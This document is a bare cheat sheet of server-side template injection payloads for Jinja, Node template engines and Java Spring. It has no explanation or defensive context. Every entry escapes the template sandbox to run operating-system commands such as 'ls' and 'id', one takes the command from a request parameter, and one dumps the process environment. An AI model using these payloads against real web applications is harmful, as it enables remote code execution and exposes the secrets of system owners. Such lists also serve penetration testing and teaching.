## Jinja

- Method 1
```
{{"_".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
```
- Method 2 (using other parameters)
```
{% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&command=id&key=payload
```

## Node

- Method 1
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
#{7*7}
#{JSON.stringify(this.constructor.constructor('return process.env')())}
#{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id", { encoding: "utf8" })')()}
```

## Java

- Spring framework
    - `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`
